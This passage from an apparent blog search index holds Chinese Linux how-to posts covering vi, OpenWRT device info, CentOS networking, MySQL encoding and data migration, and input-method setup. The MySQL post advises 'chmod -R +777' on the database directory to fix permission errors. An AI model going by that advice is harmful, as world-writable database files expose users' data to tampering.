0：定位到当前行行首$：定位到当前行行末G：定位到最后一行行首u：撤销Cirl+r：重做dd：删除整行dw：删除一个单词yy：复制一行（3yy 复制三行）p：粘帖x：删除一个字符PS：数字加命令，表示把当前行为重复多少次命令行模式的几个常用命令:wq 保存并退出:q 退出:q! 强制退出:e /etc/prpr 放弃当前文件去读取 / etc/prpr 文件:e! 放弃当前修改并重新读取当前文件:set nu 显示行号:set nonu 不显示行号:15 跳转到第 15 行:w aa.backup 将当前文档另存为到 aa.backup 中:r prpr 将 prpr 文件中的内容读入到文件末尾:r !ls 将 ls 命令的结果读入到文件末尾:1,5 w &gt;&gt; aa.backup 将 1 到 5 行追加到 aa.backup 中去:1,$s/haha/ahah/g 将当前文档中第一行到最后一行中的 haha 全部替换成 ahah 并忽略提示，c 表示提示修改，g 表示忽略提示/haha：查找 “haha” 这个字符串，使用 n 跳转到下一个PS：如果要使显示行号功能随 vi 启动，需要编辑 ~/.vimrc 这个文件vi 多重编辑：vi -o /proc/devices /proc/iomem 上下分块vi -O /proc/devices /proc/iomem 左右分块Cirl+w 切换不同分块综合来讲，vi 用熟不容易，要记的命令很多，但用熟了之后肯定会让人觉得很厉害，因为熟练使用 vi 的人编写文档的速度非常快。","categories":[{"name":"日常运维","slug":"日常运维","permalink":"https://hexo.bangz.me/categories/日常运维/"}],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://hexo.bangz.me/tags/Linux基础/"},{"name":"操作系统","slug":"操作系统","permalink":"https://hexo.bangz.me/tags/操作系统/"}]},{"title":"OpenWRT 系统研究，查看基础设备信息","slug":"19","date":"2015-03-24T07:53:00.000Z","updated":"2018-06-08T07:07:53.000Z","comments":true,"path":"archives/openwrt-get-device-infomation.html","link":"","permalink":"https://hexo.bangz.me/archives/openwrt-get-device-infomation.html","excerpt":"在 OpenWRT 下默认没有自带 lspci，lshw，今晚断网之后自己尝试去摸索，以下是今晚摸索到的信息按了下 Tab 键，看了下命令表，发现在 OpenWRT 里的基础程序屈指可数，真不愧是嵌入式系统1234567891011121314 clear dropbearkey halt ip6tables-save lock modinfo opkg reset swconfig true which [[ cmp du head ipcalc.sh logd modprobe passwd rm switch_root ubus wifi arping cp echo hexdump iptables logger mount pgrep rmdir sync ubusd wpa_supplicant ash crond egrep hostapd iptables-restore login.sh mount_root pidof rmmod sysctl uci wpad askfirst crontab env hostid iptables-save logread mtd ping route sysupgrade udevtrigger xargs awk cut expr hotplug-call iw ls mv ping6 scp tail udhcpc xtables-multi basename date false hwclock jffs2mark lsmod nc pivot_root sed tar uhttpd yes brctl dbclient fgrep id jffs2reset lua netifd poweroff seq tee umount zcat bunzip2 dd find ifconfig jshn luci-bwc netmsg pppd sh telnet uname busybox devmem firstboot ifdown jsonfilter luci-reload netstat printf sleep telnetd uniq bzcat devstatus free ifstatus kill md5sum nice procd snapshot test uptime cat df fsync ifup killall mkdir nslookup ps snapshot_tool time validate_data chgrp dirname fw3 init kmodloader mkfifo ntpd pwd sort top vconfig chmod dmesg grep insmod led.sh mknod odhcp6c readlink ssh touch vi chown dnsmasq gunzip ip6tables less mkswap odhcpd reboot start-stop-daemon tr wc chroot dropbear gzip ip6tables-restore ln mktemp odhcpd-update reload_config strings traceroute wget 发现有几个比较好玩的命令 以前学 C 语言的时候一直以为 printf 只是一个普通的 IO 流函数，没想到在 linux 下居然有这个命令 printf 其实这个跟 echo 差不多，但是它支持转义字符和字符串，比如这样","text":"在 OpenWRT 下默认没有自带 lspci，lshw，今晚断网之后自己尝试去摸索，以下是今晚摸索到的信息按了下 Tab 键，看了下命令表，发现在 OpenWRT 里的基础程序屈指可数，真不愧是嵌入式系统1234567891011121314 clear dropbearkey halt ip6tables-save lock modinfo opkg reset swconfig true which [[ cmp du head ipcalc.sh logd modprobe passwd rm switch_root ubus wifi arping cp echo hexdump iptables logger mount pgrep rmdir sync ubusd wpa_supplicant ash crond egrep hostapd iptables-restore login.sh mount_root pidof rmmod sysctl uci wpad askfirst crontab env hostid iptables-save logread mtd ping route sysupgrade udevtrigger xargs awk cut expr hotplug-call iw ls mv ping6 scp tail udhcpc xtables-multi basename date false hwclock jffs2mark lsmod nc pivot_root sed tar uhttpd yes brctl dbclient fgrep id jffs2reset lua netifd poweroff seq tee umount zcat bunzip2 dd find ifconfig jshn luci-bwc netmsg pppd sh telnet uname busybox devmem firstboot ifdown jsonfilter luci-reload netstat printf sleep telnetd uniq bzcat devstatus free ifstatus kill md5sum nice procd snapshot test uptime cat df fsync ifup killall mkdir nslookup ps snapshot_tool time validate_data chgrp dirname fw3 init kmodloader mkfifo ntpd pwd sort top vconfig chmod dmesg grep insmod led.sh mknod odhcp6c readlink ssh touch vi chown dnsmasq gunzip ip6tables less mkswap odhcpd reboot start-stop-daemon tr wc chroot dropbear gzip ip6tables-restore ln mktemp odhcpd-update reload_config strings traceroute wget 发现有几个比较好玩的命令 以前学 C 语言的时候一直以为 printf 只是一个普通的 IO 流函数，没想到在 linux 下居然有这个命令 printf 其实这个跟 echo 差不多，但是它支持转义字符和字符串，比如这样 1root@OpenWrt:/# printf \"haha\\n\\t\\\\haha\\n\" haha \\haha root@OpenWrt:/# 挺好玩的，在比如说这个命令 find，比如我要找 proc 的位置，就这样打1find proc | more 打了这个命令之后，一下子搜到好多结果！ 下面还是来说正题吧，proc 这个目录确实才是我想说的，很多关于硬件的基本信息都在这里 用 ls 看了一下 proc 目录里的东西，大概会看到这么一些文件12345678910111213141516171819202122232425262728293031 ls -al /proc/ -r--r--r-- 1 root root 0 Oct 1 19:16 cmdline -r--r--r-- 1 root root 0 Oct 1 19:16cpuinfo -r--r--r-- 1 root root 0 Oct 1 19:16 crypto -r--r--r-- 1 root root 0 Oct 1 19:16 devices -r--r--r-- 1 root root 0 Oct 1 19:16 diskstats -rw------- 1 root root 0 Oct 1 19:16 eth0.1 -rw------- 1 root root 0 Oct 1 19:16 eth0.2 -r--r--r-- 1 root root 0 Oct 1 19:16 filesystems dr-xr-xr-x 3 root root 0 Oct 1 19:16fs -r--r--r-- 1 root root 0 Oct 1 19:16 interrupts -r--r--r-- 1 root root 0 Oct 1 19:16 iomem -r--r--r-- 1 root root 0 Oct 1 19:16 ioports -r--r--r-- 1 root root 0 Oct 1 19:16 kallsyms -r--r--r-- 1 root root 0 Oct 1 19:16 key-users -r-------- 1 root root 0 Oct 1 14:32 kmsg -r--r--r-- 1 root root 0 Oct 1 19:16 loadavg -r--r--r-- 1 root root 0 Oct 1 19:16 meminfo -r--r--r-- 1 root root 0 Oct 1 19:16 misc -r--r--r-- 1 root root 0 Oct 1 19:16 modules lrwxrwxrwx 1 root root 11 Oct 1 19:16 mounts -&gt; self/mounts -r--r--r-- 1 root root 0 Oct 1 19:16 mtd lrwxrwxrwx 1 root root 8 Oct 1 19:16 net -&gt; self/net -r--r--r-- 1 root root 0 Oct 1 19:16 partitions lrwxrwxrwx 1 root root 0 Jan 1 1970 self -&gt; 18827 -r--r--r-- 1 root root 0 Oct 1 19:16 softirqs -r--r--r-- 1 root root 0 Oct 1 19:16 stat -r--r--r-- 1 root root 0 Oct 1 19:16 swaps -r--r--r-- 1 root root 0 Oct 1 19:16 uptime -r--r--r-- 1 root root 0 Oct 1 19:16 version -r--r--r-- 1 root root 0 Oct 1 19:16 vmstat这些东西让我产生了好奇，用 cat 看了一下，比如 cat /proc/mounts看到结果之后瞬间秒懂！ 原来 mount 的命令里的数据全存在这个文件里了，它还是指向 / self/mounts 的 再来看看 meminfo 12345678910111213141516171819202122232425262728293031323334cat /proc/meminfo MemTotal: 29372 kB MemFree: 5648 kB Buffers: 2056 kB Cached: 8148 kB SwapCached: 0 kB Active: 7704 kB Inactive: 4176 kB Active(anon): 2292 kB Inactive(anon): 52 kB Active(file): 5412 kB Inactive(file): 4124 kB Unevictable: 0 kB Mlocked: 0 kB SwapTotal: 0 kB SwapFree: 0 kB Dirty: 0 kB Writeback: 0 kB AnonPages: 1692 kB Mapped: 1404 kB Shmem: 668 kB Slab: 7820 kB SReclaimable: 2880 kB SUnreclaim: 4940 kB KernelStack: 248 kB PageTables: 232 kB NFS_Unstable: 0 kB Bounce: 0 kB WritebackTmp: 0 kB CommitLimit: 14684 kB Committed_AS: 5012 kB VmallocTotal: 1048372 kB VmallocUsed: 1300 kB VmallocChunk: 1044340 kB 这个文件里的东西还真的比 free 来的清楚！这地方甚至还可以看到 RAM 的存储地址分布！ 12345678910111213cat iomem 00000000-01ffffff : System RAM 00000000-0023b39f : Kernel code 0023b3a0-002caf8b : Kernel data 10000000-100000ff : /palmbus@10000000/sysc@0 10000100-1000011f : /palmbus@10000000/timer@100 10000120-1000012f : /palmbus@10000000/watchdog@120 10000200-100002ff : /palmbus@10000000/intc@200 10000300-100003ff : /palmbus@10000000/memc@300 10000600-10000633 : /palmbus@10000000/gpio@600 10000c00-10000cff : serial 10100000-1010270f : /ethernet@10100000 1f000000-1f7fffff : 1f000000.cfi 趁着这一口气，把这个文件夹里面的东西都看了个遍，看到了很多设备的数据，像 cpuinfo 能看 CPU 型号，mtd 可以看到 flash 的地址构成等等123456789101112131415root@OpenWrt:/proc# cat mtddev: size erasesize namemtd0: 00030000 00010000 \"u-boot\"mtd1: 00010000 00010000 \"devdata\"mtd2: 00010000 00010000 \"devconf\"mtd3: 003b0000 00010000 \"firmware\"mtd4: 002ae819 00010000 \"rootfs\"mtd5: 000a0000 00010000 \"rootfs_data\"root@OpenWrt:/proc# cat partitions major minor #blocks name 31 0 192 mtdblock0 31 1 64 mtdblock1 31 2 64 mtdblock2 31 3 3776 mtdblock3 31 4 2746 mtdblock4 31 5 640 mtdblock5 果然这里是个很方便的地方，在这里就可以很轻松的确认设备信息了。","categories":[{"name":"项目开发","slug":"项目开发","permalink":"https://hexo.bangz.me/categories/项目开发/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://hexo.bangz.me/tags/随笔/"},{"name":"Linux基础","slug":"Linux基础","permalink":"https://hexo.bangz.me/tags/Linux基础/"},{"name":"操作系统","slug":"操作系统","permalink":"https://hexo.bangz.me/tags/操作系统/"},{"name":"OpenWRT","slug":"OpenWRT","permalink":"https://hexo.bangz.me/tags/OpenWRT/"}]},{"title":"在 linuxmint 上编译自己的 OpenWRT，并安装到 DIR-615 D4 上","slug":"18","date":"2015-03-24T04:56:00.000Z","updated":"2018-06-08T07:37:05.000Z","comments":true,"path":"archives/compile-opwnwrt-on-linuxmint.html","link":"","permalink":"https://hexo.bangz.me/archives/compile-opwnwrt-on-linuxmint.html","excerpt":"下载 OpenWRT barrier_breaker 源代码1svn co svn://svn.openwrt.org/openwrt/branches/barrier_breaker 下载完后进入目录1cd barrier_breaker/ 根据 feeds.conf.default 生成一份新的 feeds.conf1cp feeds.conf.default feeds.conf 编辑 feeds.conf1pluma feeds.conf 添加 scutclient1src-svn scut https://github.com/liuqun/openwrt-clients/tree/master/scut/","text":"下载 OpenWRT barrier_breaker 源代码1svn co svn://svn.openwrt.org/openwrt/branches/barrier_breaker 下载完后进入目录1cd barrier_breaker/ 根据 feeds.conf.default 生成一份新的 feeds.conf1cp feeds.conf.default feeds.conf 编辑 feeds.conf1pluma feeds.conf 添加 scutclient1src-svn scut https://github.com/liuqun/openwrt-clients/tree/master/scut/ 参考资料： https://dev.openwrt.org.cn/wiki/DevelopmentIndexhttp://www.360doc.com/content/13/1123/14/14641369_331534139.shtmlhttp://forum.anywlan.com/thread-272174-1-1.htmlhttps://dev.openwrt.org/wiki/GetSourcehttp://www.7forz.com/1973/#comment-366https://github.com/liuqun/openwrt-clients/tree/master/scuthttp://wiki.openwrt.org/zh-cn/doc/howto/obtain.firmware.generatehttp://blog.csdn.net/liuzhuchen/article/details/22798563http://www.v2ex.com/t/13051http://www.it165.net/network/html/201303/1004.htmlhttp://www.ccs.neu.edu/home/noubir/Courses/CS6710/S12/material/OpenWrt_Dev_Tutorial.pdfhttp://softwaredownload.gitbooks.io/openwrt-fanqiang/content/ebook/04.1.html","categories":[{"name":"项目开发","slug":"项目开发","permalink":"https://hexo.bangz.me/categories/项目开发/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://hexo.bangz.me/tags/随笔/"},{"name":"Shell","slug":"Shell","permalink":"https://hexo.bangz.me/tags/Shell/"},{"name":"Linux基础","slug":"Linux基础","permalink":"https://hexo.bangz.me/tags/Linux基础/"},{"name":"OpenWRT","slug":"OpenWRT","permalink":"https://hexo.bangz.me/tags/OpenWRT/"}]},{"title":"基于 CentOS 7 的多网卡配置","slug":"16","date":"2015-03-16T05:48:00.000Z","updated":"2018-06-08T07:07:53.000Z","comments":true,"path":"archives/centos-7-multi-network-card-configuation.html","link":"","permalink":"https://hexo.bangz.me/archives/centos-7-multi-network-card-configuation.html","excerpt":"最近接手了学校的一个云计算的项目，是关于 openstack 的服务器架设的，涉及到了 CentOS 7，个人对 Red Hat 阵营的命令不太熟，于是把最近学来的适用与 CentOS 的一些基础命令做一些笔记根据指导老师的要求，计划将会对以下内容进行学习笔记 1、linux 的多网卡配置2、vi 编辑器的使用3、yum 工具的使用4、服务的查询、停止、重启5、常用 linux 命令（文件管理等）6、了解 linux 查看物理网卡接口 lspci | grep NetWork，查看 PCI 插槽上的网络设备lsusb，查看 USB 插槽处的网卡设备 查看网卡信息 ifconfig 查看正在活动中的网卡（net-tools）ifconfig -a 查看所有网络连接设备 注：如果提示找不到 ifconfig，就安装一下 net-tools","text":"最近接手了学校的一个云计算的项目，是关于 openstack 的服务器架设的，涉及到了 CentOS 7，个人对 Red Hat 阵营的命令不太熟，于是把最近学来的适用与 CentOS 的一些基础命令做一些笔记根据指导老师的要求，计划将会对以下内容进行学习笔记 1、linux 的多网卡配置2、vi 编辑器的使用3、yum 工具的使用4、服务的查询、停止、重启5、常用 linux 命令（文件管理等）6、了解 linux 查看物理网卡接口 lspci | grep NetWork，查看 PCI 插槽上的网络设备lsusb，查看 USB 插槽处的网卡设备 查看网卡信息 ifconfig 查看正在活动中的网卡（net-tools）ifconfig -a 查看所有网络连接设备 注：如果提示找不到 ifconfig，就安装一下 net-tools 安装方法：1yum -y install net-tools 关闭指定网卡设备1ifdown eth0 打开指定网卡设备1ifup eth0 修改指定网卡的 ip1vi /etc/sysconfig/network-scripts/ifcfg-eno1 标准的以太网配置信息 TYPE=EthernetBOOTPROTO=staticDEFROUTE=yesIPV4_FAILURE_FATAL=noIPV6INIT=yesIPV6_AUTOCONF=yesIPV6_DEFROUTE=yesIPV6_FAILURE_FATAL=noNAME=eno1UUID=8a183b33-12ff-4067-8320-c6fdb34444feONBOOT=yesHWADDR=2C:44:FD:7A:DC:80PEERDNS=yesPEERROUTES=yesIPV6_PEERDNS=yesIPV6_PEERROUTES=yesIPADDR=10.3.16.202PREFIX=24GATEWAY=10.3.16.254DNS1=8.8.4.4NETMASK=255.255.255.0 通过 systemd 的 systemctl 重启所有网卡1service network restart","categories":[{"name":"日常运维","slug":"日常运维","permalink":"https://hexo.bangz.me/categories/日常运维/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://hexo.bangz.me/tags/Shell/"},{"name":"Linux基础","slug":"Linux基础","permalink":"https://hexo.bangz.me/tags/Linux基础/"},{"name":"操作系统","slug":"操作系统","permalink":"https://hexo.bangz.me/tags/操作系统/"},{"name":"云计算","slug":"云计算","permalink":"https://hexo.bangz.me/tags/云计算/"},{"name":"CentOS","slug":"CentOS","permalink":"https://hexo.bangz.me/tags/CentOS/"}]},{"title":"使用 java 在 linux 环境下连接 mysql 乱码问题","slug":"15","date":"2015-02-12T21:51:00.000Z","updated":"2018-06-08T07:07:53.000Z","comments":true,"path":"archives/jdbc-out-garbled-on-linux.html","link":"","permalink":"https://hexo.bangz.me/archives/jdbc-out-garbled-on-linux.html","excerpt":"java 方面1. 在 url 连接参数后面添加数据1jdbc:mysql://localhost:3306/test?useUnicode=true&amp;amp;characterEncoding=utf-8 该参数的作用是：指定字符的编码、解码格式。 例如：mysql 数据库用的是 gbk 编码，而项目数据库用的是 utf-8 编码。这时候如果添加了 useUnicode=true&amp;characterEncoding=UTF-8 ，那么作用有如下两个方面： 存数据时：数据库在存放项目数据的时候会先用 UTF-8 格式将数据解码成字节码，然后再将解码后的字节码重新使用 GBK 编码存放到数据库中。 取数据时：在从数据库中取数据的时候，数据库会先将数据库中的数据按 GBK 格式解码成字节码，然后再将解码后的字节码重新按 UTF-8 格式编码数据，最后再将数据返回给客户端。 2.request response 设置的编码设置成 utf-8 形式12request.setCharacterEncoding(\"utf-8\");response.setContentType(\"text/html;charset=utf-8\");","text":"java 方面1. 在 url 连接参数后面添加数据1jdbc:mysql://localhost:3306/test?useUnicode=true&amp;amp;characterEncoding=utf-8 该参数的作用是：指定字符的编码、解码格式。 例如：mysql 数据库用的是 gbk 编码，而项目数据库用的是 utf-8 编码。这时候如果添加了 useUnicode=true&amp;characterEncoding=UTF-8 ，那么作用有如下两个方面： 存数据时：数据库在存放项目数据的时候会先用 UTF-8 格式将数据解码成字节码，然后再将解码后的字节码重新使用 GBK 编码存放到数据库中。 取数据时：在从数据库中取数据的时候，数据库会先将数据库中的数据按 GBK 格式解码成字节码，然后再将解码后的字节码重新按 UTF-8 格式编码数据，最后再将数据返回给客户端。 2.request response 设置的编码设置成 utf-8 形式12request.setCharacterEncoding(\"utf-8\");response.setContentType(\"text/html;charset=utf-8\"); mysql 方面:创建数据库时候要指定 UTF-8 编码1create database (数据库名字) default character set='utf8'; 注意 utf8 中间没有 - 设置完成以上两步 程序插入中文和读取中文都没有问题了,但是: 接下来的问题是 有些同学插入的数据是中文 但是 select 语句一执行 就出先现???别着急 那是因为 mysql 终端数据显示编码不一致，在 mysql -uroot -p 进入 mysql 执行1set names \"utf8\"; 至此乱码问题解决 windows 下把以上 utf-8 改成 gbk 即可","categories":[{"name":"日常运维","slug":"日常运维","permalink":"https://hexo.bangz.me/categories/日常运维/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://hexo.bangz.me/tags/Shell/"},{"name":"Linux基础","slug":"Linux基础","permalink":"https://hexo.bangz.me/tags/Linux基础/"},{"name":"操作系统","slug":"操作系统","permalink":"https://hexo.bangz.me/tags/操作系统/"},{"name":"MySQL","slug":"MySQL","permalink":"https://hexo.bangz.me/tags/MySQL/"}]},{"title":"换了操作系统之后 MySQL 数据的恢复","slug":"11","date":"2015-02-03T06:18:00.000Z","updated":"2018-06-08T10:26:51.000Z","comments":true,"path":"archives/mysql-data-restore-after-reinstall-system.html","link":"","permalink":"https://hexo.bangz.me/archives/mysql-data-restore-after-reinstall-system.html","excerpt":"先容我发泄一下。。。 最近一段时间忙着开发一个软件，不过又刚好装了新的 linuxmint，为了贪个新鲜，想在上面试着开发 java，昨天下了个 intelij-ideaIC 玩，感觉很不错，打算就用这个来代替原来 windows 下的 eclipse，因为这个软件要用到 MySQL，所以打算把原来 windows 上的 MySQL 数据库中的内容导出，放到 linux 这边来。可是很不巧，今儿个早不知道怎么的进 Win7 就卡在 logo 画面无限循环了，想着可能是引导之类的小问题，用 fsck 进去弄了下，不行，再用 ntfsfix，可是怎么弄也进不去。 马上感觉不对劲了，初步判断可能是 winload 之类的问题。于是拿出 U 盘进 PE，居然卡死！只能进安全模式，可是一用修复工具去读 C 盘的时候马上修复工具就假死了。 接着拿出 win7 启动光盘出来，进入正常的 win7 安装流程，点修复计算机，出乎我预料的连这个都假死了。于是按照一些人的的说法把硬盘拆下来挂到盒子上去用另外一台 Win7 去修复。chkdsk 过了，无效，磁盘整理，DG 分区表修复什么的都试了一遍，不行。","text":"先容我发泄一下。。。 最近一段时间忙着开发一个软件，不过又刚好装了新的 linuxmint，为了贪个新鲜，想在上面试着开发 java，昨天下了个 intelij-ideaIC 玩，感觉很不错，打算就用这个来代替原来 windows 下的 eclipse，因为这个软件要用到 MySQL，所以打算把原来 windows 上的 MySQL 数据库中的内容导出，放到 linux 这边来。可是很不巧，今儿个早不知道怎么的进 Win7 就卡在 logo 画面无限循环了，想着可能是引导之类的小问题，用 fsck 进去弄了下，不行，再用 ntfsfix，可是怎么弄也进不去。 马上感觉不对劲了，初步判断可能是 winload 之类的问题。于是拿出 U 盘进 PE，居然卡死！只能进安全模式，可是一用修复工具去读 C 盘的时候马上修复工具就假死了。 接着拿出 win7 启动光盘出来，进入正常的 win7 安装流程，点修复计算机，出乎我预料的连这个都假死了。于是按照一些人的的说法把硬盘拆下来挂到盒子上去用另外一台 Win7 去修复。chkdsk 过了，无效，磁盘整理，DG 分区表修复什么的都试了一遍，不行。 实在是受不了了，感觉不是这么简单的问题了，可能是硬盘出问题了，于是用 HD tune 看了一下，果然，当前待映射扇区数那黄了。。。用硬盘检测工具扫了一下，还真有坏道了。。。。瞬间心情就糟糕下来了，因为以前犯过一次错，无视硬盘问题继续疯狂使用，结果造成了不小的数据损失，所以我已经不想去修复坏道了。。直接就去下单了一个 7200 转的日立 2.5 寸 HDD。开始备份数据。 于是就在 linuxmint 上搞了起来，原来 windows 下的 MySQL 数据库中的数据怎么搬过来呢？ 想着以前有听说过只要把 data 文件夹转移就行。我就亲手实践了一下，折腾了老半天，终于弄好了，这个方法果然可行！下面就说下方法：1sudo apt-get install mysql-server-5.6 mysql-client-5.6 一路上照常的样子安装就行，安装好之后进1mysql -u root -p 回车，直接进入 mysql，如果登录失败，可能是服务没打开，用这个启动 mysql 的服务1service mysql start 启动好之后再进就没问题了，如果忘记了 mysql 的密码，也可以 mysqladmin 设置一下1mysqladmin -u root password '你的密码' 接着我们要弄数据库的话，首先要知道这个数据库的存放在哪里，直接进 mysql 然后查 mysql 的系统变量看看1show variables like 'datadir'; 查到再 / var/lib/mysql 下，接着开始干正活，找到原来 windows 下的数据库的位置，这个就要自己手动找了，找到了 my.ini 的位置就算找到了。（想不到我当初我放在 SSD 上了，找了好久！） 找到之后进 data 文件夹，这下就看到了很熟悉的东西了，没错就是这里！我建的数据库，一眼就认出来了！（我当时兴高采烈的直接就把 data 下的所有东西直接复制到 / var/lib/mysql / 下，结果 mysql 打不开了 = =） 这时候不要着急，看看里面的文件夹，像 mysql，performance_schema 之类的目录明显就是原来的默认数据库，这个不能动，动了的话，原来的数据库中的用户数据信息就会覆盖现在的数据库中的用户信息，会出错的。原来数据库中的 gcu_games 对应了这里的 gcu_games 目录，classinfo 对应了这里的 classinfo 目录，所以现在要在新的 mysql 里面建立对应的数据库，比如1create database classinfo; 这样 / var/lib/mysql 中就会多出 classinfo 这个目录，这个时候就能把原来 classinfo 目录中的数据覆盖过来了，这时候试一下看看。12use classinfoshow tables; 看到了表里面有东西了，可是这个时候用 select 语句去查询的话会出 Mysql table ‘’ doesn`t exist 这个问题，这是因为 InnoDB 类型的数据库，他的数据会存在 ibdata1 这个文件里，具体的可以参考 这里所以要把原来的 ibdata1 也搬过来，不过这个时候要先关掉 mysql 服务了，在 terminal 里面输入1service mysql stop 然后再把 ibdata1 这个文件搬过来，搬之前最好把原来的文件做个备份。这个时候最好改一下 / var/lib/mysql 这个目录的权限，不然可能会遇到 access denied 之类的问题1chmod -R +777 /var/lib/mysql 改完之后再启动 mysql 服务，1service mysql start 这时候应该就能进 mysql 里面用 select 正常的查询数据库了，大功告成！ 参考资料： http://blog.zuobus.com/archives/68.htmlhttp://blog.csdn.net/yxwmzouzou/article/details/14165467http://blog.csdn.net/qysh123/article/details/11695637http://blog.sina.com.cn/s/blog_a23e4a880101h2d4.htmlhttp://yunjiechao-163-com.iteye.com/blog/1305048","categories":[{"name":"日常运维","slug":"日常运维","permalink":"https://hexo.bangz.me/categories/日常运维/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://hexo.bangz.me/tags/随笔/"},{"name":"Shell","slug":"Shell","permalink":"https://hexo.bangz.me/tags/Shell/"},{"name":"Linux基础","slug":"Linux基础","permalink":"https://hexo.bangz.me/tags/Linux基础/"},{"name":"操作系统","slug":"操作系统","permalink":"https://hexo.bangz.me/tags/操作系统/"},{"name":"MySQL","slug":"MySQL","permalink":"https://hexo.bangz.me/tags/MySQL/"}]},{"title":"linux mint 17.1 MATE 下的搜狗输入法安装","slug":"6","date":"2015-02-01T20:52:00.000Z","updated":"2018-06-08T10:26:51.000Z","comments":true,"path":"archives/linuxmint-install-sogou-input-method.html","link":"","permalink":"https://hexo.bangz.me/archives/linuxmint-install-sogou-input-method.html","excerpt":"cinnamon 玩了几天，个人感觉不是很好，于是换了 MATE，果然 compiz 的效果很赞可是这中文输入法的安装可真让我头疼了好久。装搜狗弄了半天，遇到了一大堆问题。。。有点恶心了，比 cinnamon 里面麻烦多了走了好多好多弯路之后，总算弄好了，这里说一下我的配置方法首先到搜狗官方网站先下载 deb 安装程序http://pinyin.sogou.com/linux/?r=pinyin然后打开 terminal添加 fcitx 的 PPA 源1sudo add-apt-repository ppa:fcitx-team/nightly 更新源1sudo apt-get update 装一下 fcitx 以及它的插件","text":"cinnamon 玩了几天，个人感觉不是很好，于是换了 MATE，果然 compiz 的效果很赞可是这中文输入法的安装可真让我头疼了好久。装搜狗弄了半天，遇到了一大堆问题。。。有点恶心了，比 cinnamon 里面麻烦多了走了好多好多弯路之后，总算弄好了，这里说一下我的配置方法首先到搜狗官方网站先下载 deb 安装程序http://pinyin.sogou.com/linux/?r=pinyin然后打开 terminal添加 fcitx 的 PPA 源1sudo add-apt-repository ppa:fcitx-team/nightly 更新源1sudo apt-get update 装一下 fcitx 以及它的插件 1sudo apt-get install fcitx fcitx-config-gtk fcitx-frontend-all fcitx-frontend-gtk2 fcitx-frontend-gtk3 fcitx-frontend-qt4 fcitx-ui-classic fcitx-table-all fcitx-module-kimpanel fcitx-module-dbus libopencc1 fcitx-libs-qt PS：装完 fcitx 之后最好去 update Manager 里面看看，如果有 fcitx 的话就用 update Manager 更新一下 安装 xcompmgr，这玩意能够解决小黑块问题1sudo apt-get install xcompmgr 配置一下 language settings，把 GBK,GB18030,GB2312 装上去 PS：顺便看一下下面的 fcitx 那里，如果是红色字说缺少组件，就点一下右边的按钮，安装缺少的组件 再配置一下 Input Method，设成 fcitx 重启一遍，安装下载好的搜狗官方的 deb 文件（双击安装即可）也可以1sudo dpkg -i sogou_pinyin_linux_1.1.0.0037_amd64.deb 再重启一遍，找个地方打字，看看会不会出现小黑块的问题如果出现了，就再 startup application 里面增加一个启动项，xcompmgr &amp; PS：如果任务栏出现两个输入法，那就禁用掉 fcitx 的启动到此就算完了，不得不感慨一下，想不到一个输入法这么难弄。弄完了都觉得好有成就感。。 参考资料： http://www.lupaworld.com/home.php?mod=space&amp;uid=438368&amp;do=blog&amp;id=254909http://www.mintos.org/config/mint-qiana-config.htmlhttp://pinyin.sogou.com/linux/help.phphttp://tieba.baidu.com/p/3186327507","categories":[{"name":"日常运维","slug":"日常运维","permalink":"https://hexo.bangz.me/categories/日常运维/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://hexo.bangz.me/tags/随笔/"},{"name":"Linux基础","slug":"Linux基础","permalink":"https://hexo.bangz.me/tags/Linux基础/"},{"name":"操作系统","slug":"操作系统","permalink":"https://hexo.bangz.me/tags/操作系统/"}]},{"title":"linux 下的 shadowsocks 客户端","slug":"3","date":"2015-01-31T06:24:00.000Z","updated":"2018-06-08T10:26:53.000Z","comments":true,"path":"archives/linux-ss-client.html","link":"","permalink":"https://hexo.bangz.me/archives/linux-ss-client.html","excerpt":"用着 gnome 的桌面想用用 gui 的 shadowsocks，结果发现这玩意还不好找好不容易找到了，可惜是放在了 sourceforge 上，sourceforge 经常被墙这里先留一个百度网盘的链接备着吧","text":"用着 gnome 的桌面想用用 gui 的 shadowsocks，结果发现这玩意还不好找好不容易找到了，可惜是放在了 sourceforge 上，sourceforge 经常被墙这里先留一个百度网盘的链接备着吧 File：shadowsocks-gui-0.6.4-linux-x64.tar.xzURL：http://pan.baidu.com/s/1sjwkf7nSourceForgeLink：http://sourceforge.net/projects/shadowsocksgui/","categories":[{"name":"实用工具","slug":"实用工具","permalink":"https://hexo.bangz.me/categories/实用工具/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://hexo.bangz.me/tags/随笔/"},{"name":"Linux基础","slug":"Linux基础","permalink":"https://hexo.bangz.me/tags/Linux基础/"},{"name":"操作系统","slug":"操作系统","permalink":"https://hexo.bangz.me/tags/操作系统/"},{"name":"Shadowsocks","slug":"Shadowsocks","permalink":"https://hexo.bangz.me/tags/Shadowsocks/"}]}]}